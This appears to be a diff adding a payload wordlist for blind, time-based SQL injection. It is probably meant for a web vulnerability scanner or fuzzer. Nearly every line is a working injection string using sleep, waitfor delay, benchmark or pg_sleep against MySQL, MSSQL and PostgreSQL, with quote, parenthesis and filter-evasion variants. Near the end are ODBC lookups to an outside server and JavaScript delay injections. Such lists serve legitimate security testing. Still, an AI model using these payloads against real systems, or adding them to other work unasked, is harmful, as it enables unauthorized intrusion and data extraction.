@@ -1,0 +1,218 @@
+sleep(__TIME__)#1
+sleep(__TIME__)#[LF]1
+[VALUE],sleep(__TIME__)#1
+[VALUE]`,sleep(__TIME__)#1
+1 or sleep(__TIME__)#1
+1 or sleep(__TIME__)#[LF]1
+" or sleep(__TIME__)#1
+" or sleep(__TIME__)#[LF]1
+' or sleep(__TIME__)#1
+' or sleep(__TIME__)#[LF]1
+" or sleep(__TIME__)="
+' or sleep(__TIME__)='
+1) or sleep(__TIME__)#1
+1) or sleep(__TIME__)#[LF]1
+") or sleep(__TIME__)="
+') or sleep(__TIME__)='
+1)) or sleep(__TIME__)#1
+1)) or sleep(__TIME__)#[LF]1
+")) or sleep(__TIME__)="
+')) or sleep(__TIME__)='
+1 and sleep(__TIME__)#1
+1 and sleep(__TIME__)#[LF]1
+" and sleep(__TIME__)#1
+" and sleep(__TIME__)#[LF]1
+' and sleep(__TIME__)#1
+' and sleep(__TIME__)#[LF]1
+" and sleep(__TIME__)="
+' and sleep(__TIME__)='
+1) and sleep(__TIME__)#1
+1) and sleep(__TIME__)#[LF]1
+") and sleep(__TIME__)="
+') and sleep(__TIME__)='
+1)) and sleep(__TIME__)#1
+1)) and sleep(__TIME__)#[LF]1
+")) and sleep(__TIME__)="
+')) and sleep(__TIME__)='
+;waitfor delay '0:0:__TIME__'--1
+[VALUE];waitfor delay '0:0:__TIME__'--1
+[VALUE] waitfor delay '0:0:__TIME__'--1
+;waitfor delay '0:0:__TIME__'--[LF]1
+);waitfor delay '0:0:__TIME__'--1
+[VALUE]);waitfor delay '0:0:__TIME__'--1
+);waitfor delay '0:0:__TIME__'--[LF]1
+';waitfor delay '0:0:__TIME__'--1
+';waitfor delay '0:0:__TIME__'--[LF]1
+";waitfor delay '0:0:__TIME__'--1
+";waitfor delay '0:0:__TIME__'--[LF]1
+');waitfor delay '0:0:__TIME__'--1
+');waitfor delay '0:0:__TIME__'--[LF]1
+");waitfor delay '0:0:__TIME__'--1
+");waitfor delay '0:0:__TIME__'--[LF]1
+));waitfor delay '0:0:__TIME__'--1
+[VALUE]));waitfor delay '0:0:__TIME__'--1
+));waitfor delay '0:0:__TIME__'--[LF]1
+'));waitfor delay '0:0:__TIME__'--1
+'));waitfor delay '0:0:__TIME__'--[LF]1
+"));waitfor delay '0:0:__TIME__'--1
+"));waitfor delay '0:0:__TIME__'--[LF]1
+benchmark(10000000,MD5(1))#1
+1 or benchmark(10000000,MD5(1))#1
+" or benchmark(10000000,MD5(1))#1
+' or benchmark(10000000,MD5(1))#1
+1) or benchmark(10000000,MD5(1))#1
+") or benchmark(10000000,MD5(1))#1
+') or benchmark(10000000,MD5(1))#1
+1)) or benchmark(10000000,MD5(1))#1
+")) or benchmark(10000000,MD5(1))#1
+')) or benchmark(10000000,MD5(1))#1
+pg_sleep(__TIME__)--1
+pg_sleep(__TIME__)--[LF]1
+1 or pg_sleep(__TIME__)--1
+1 or pg_sleep(__TIME__)--[LF]1
+" or pg_sleep(__TIME__)--1
+" or pg_sleep(__TIME__)--[LF]1
+' or pg_sleep(__TIME__)--1
+' or pg_sleep(__TIME__)--[LF]1
+1) or pg_sleep(__TIME__)--1
+1) or pg_sleep(__TIME__)--[LF]1
+") or pg_sleep(__TIME__)--1
+") or pg_sleep(__TIME__)--[LF]1
+') or pg_sleep(__TIME__)--1
+') or pg_sleep(__TIME__)--[LF]1
+1)) or pg_sleep(__TIME__)--1
+")) or pg_sleep(__TIME__)--1
+')) or pg_sleep(__TIME__)--1
+1 and pg_sleep(__TIME__)--1
+" and pg_sleep(__TIME__)--1
+' and pg_sleep(__TIME__)--1
+1) and pg_sleep(__TIME__)--1
+") and pg_sleep(__TIME__)--1
+') and pg_sleep(__TIME__)--1
+1)) and pg_sleep(__TIME__)--1
+")) and pg_sleep(__TIME__)--1
+')) and pg_sleep(__TIME__)--1
+1[TAB]or[TAB]sleep(__TIME__)#1
+"[TAB]or[TAB]sleep(__TIME__)#1
+'[TAB]or[TAB]sleep(__TIME__)#1
+"[TAB]or[TAB]sleep(__TIME__)="
+'[TAB]or[TAB]sleep(__TIME__)='
+1)[TAB]or[TAB]sleep(__TIME__)#1
+")[TAB]or[TAB]sleep(__TIME__)="
+')[TAB]or[TAB]sleep(__TIME__)='
+1))[TAB]or[TAB]sleep(__TIME__)#1
+"))[TAB]or[TAB]sleep(__TIME__)="
+'))[TAB]or[TAB]sleep(__TIME__)='
+1[TAB]and[TAB]sleep(__TIME__)#1
+"[TAB]and[TAB]sleep(__TIME__)#1
+'[TAB]and[TAB]sleep(__TIME__)#1
+"[TAB]and[TAB]sleep(__TIME__)="
+'[TAB]and[TAB]sleep(__TIME__)='
+1)[TAB]and[TAB]sleep(__TIME__)#1
+")[TAB]and[TAB]sleep(__TIME__)="
+')[TAB]and[TAB]sleep(__TIME__)='
+1))[TAB]and[TAB]sleep(__TIME__)#1
+"))[TAB]and[TAB]sleep(__TIME__)="
+'))[TAB]and[TAB]sleep(__TIME__)='
+;waitfor[TAB]delay[TAB]'0:0:__TIME__'--1
+);waitfor[TAB]delay[TAB]'0:0:__TIME__'--1
+';waitfor[TAB]delay[TAB]'0:0:__TIME__'--1
+";waitfor[TAB]delay[TAB]'0:0:__TIME__'--1
+');waitfor[TAB]delay[TAB]'0:0:__TIME__'--1
+");waitfor[TAB]delay[TAB]'0:0:__TIME__'--1
+));waitfor[TAB]delay[TAB]'0:0:__TIME__'--1
+'));waitfor[TAB]delay[TAB]'0:0:__TIME__'--1
+"));waitfor[TAB]delay[TAB]'0:0:__TIME__'--1
+1[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+"[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+'[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+1)[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+")[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+')[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+1))[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+"))[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+'))[TAB]or[TAB]benchmark(10000000,MD5(1))#1
+1[TAB]or[TAB]pg_sleep(__TIME__)--1
+"[TAB]or[TAB]pg_sleep(__TIME__)--1
+'[TAB]or[TAB]pg_sleep(__TIME__)--1
+1)[TAB]or[TAB]pg_sleep(__TIME__)--1
+")[TAB]or[TAB]pg_sleep(__TIME__)--1
+')[TAB]or[TAB]pg_sleep(__TIME__)--1
+1))[TAB]or[TAB]pg_sleep(__TIME__)--1
+"))[TAB]or[TAB]pg_sleep(__TIME__)--1
+'))[TAB]or[TAB]pg_sleep(__TIME__)--1
+1[TAB]and[TAB]pg_sleep(__TIME__)--1
+"[TAB]and[TAB]pg_sleep(__TIME__)--1
+'[TAB]and[TAB]pg_sleep(__TIME__)--1
+1)[TAB]and[TAB]pg_sleep(__TIME__)--1
+")[TAB]and[TAB]pg_sleep(__TIME__)--1
+')[TAB]and[TAB]pg_sleep(__TIME__)--1
+1))[TAB]and[TAB]pg_sleep(__TIME__)--1
+"))[TAB]and[TAB]pg_sleep(__TIME__)--1
+'))[TAB]and[TAB]pg_sleep(__TIME__)--1
+1/**/or/**/sleep(__TIME__)#1
+"/**/or/**/sleep(__TIME__)#1
+'/**/or/**/sleep(__TIME__)#1
+"/**/or/**/sleep(__TIME__)="
+'/**/or/**/sleep(__TIME__)='
+1)/**/or/**/sleep(__TIME__)#1
+")/**/or/**/sleep(__TIME__)="
+')/**/or/**/sleep(__TIME__)='
+1))/**/or/**/sleep(__TIME__)#1
+"))/**/or/**/sleep(__TIME__)="
+'))/**/or/**/sleep(__TIME__)='
+1/**/and/**/sleep(__TIME__)#1
+"/**/and/**/sleep(__TIME__)#1
+'/**/and/**/sleep(__TIME__)#1
+"/**/and/**/sleep(__TIME__)="
+'/**/and/**/sleep(__TIME__)='
+1)/**/and/**/sleep(__TIME__)#1
+")/**/and/**/sleep(__TIME__)="
+')/**/and/**/sleep(__TIME__)='
+1))/**/and/**/sleep(__TIME__)#1
+"))/**/and/**/sleep(__TIME__)="
+'))/**/and/**/sleep(__TIME__)='
+;waitfor/**/delay/**/'0:0:__TIME__'--1
+);waitfor/**/delay/**/'0:0:__TIME__'--1
+';waitfor/**/delay/**/'0:0:__TIME__'--1
+";waitfor/**/delay/**/'0:0:__TIME__'--1
+');waitfor/**/delay/**/'0:0:__TIME__'--1
+");waitfor/**/delay/**/'0:0:__TIME__'--1
+));waitfor/**/delay/**/'0:0:__TIME__'--1
+'));waitfor/**/delay/**/'0:0:__TIME__'--1
+"));waitfor/**/delay/**/'0:0:__TIME__'--1
+1/**/or/**/benchmark(10000000,MD5(1))#1
+"/**/or/**/benchmark(10000000,MD5(1))#1
+'/**/or/**/benchmark(10000000,MD5(1))#1
+1)/**/or/**/benchmark(10000000,MD5(1))#1
+")/**/or/**/benchmark(10000000,MD5(1))#1
+')/**/or/**/benchmark(10000000,MD5(1))#1
+1))/**/or/**/benchmark(10000000,MD5(1))#1
+"))/**/or/**/benchmark(10000000,MD5(1))#1
+'))/**/or/**/benchmark(10000000,MD5(1))#1
+1/**/or/**/pg_sleep(__TIME__)--1
+"/**/or/**/pg_sleep(__TIME__)--1
+'/**/or/**/pg_sleep(__TIME__)--1
+1)/**/or/**/pg_sleep(__TIME__)--1
+")/**/or/**/pg_sleep(__TIME__)--1
+')/**/or/**/pg_sleep(__TIME__)--1
+1))/**/or/**/pg_sleep(__TIME__)--1
+"))/**/or/**/pg_sleep(__TIME__)--1
+'))/**/or/**/pg_sleep(__TIME__)--1
+1/**/and/**/pg_sleep(__TIME__)--1
+"/**/and/**/pg_sleep(__TIME__)--1
+'/**/and/**/pg_sleep(__TIME__)--1
+1)/**/and/**/pg_sleep(__TIME__)--1
+")/**/and/**/pg_sleep(__TIME__)--1
+')/**/and/**/pg_sleep(__TIME__)--1
+1))/**/and/**/pg_sleep(__TIME__)--1
+"))/**/and/**/pg_sleep(__TIME__)--1
+'))/**/and/**/pg_sleep(__TIME__)--1
+' and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+" and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+') and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+") and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+')) and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+")) and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+';d=new Date();do{cd=new Date();}while(cd-d<10000);//
+";d=new Date();do{cd=new Date();}while(cd-d<10000);//
